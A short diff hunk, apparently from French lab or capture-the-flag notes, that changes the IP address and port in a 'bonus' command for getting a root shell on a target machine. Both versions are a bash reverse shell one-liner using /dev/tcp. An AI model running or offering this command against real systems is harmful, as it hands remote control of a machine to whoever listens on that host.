@@ -325,5 +325,5 @@ BONUS:
 commande pour activer un shell root via nc (à faire sur machine cible):
 
 ```bash
-echo 'bash -i >& /dev/tcp/10.21.30.199/4444 0>&1'
+echo 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 ```
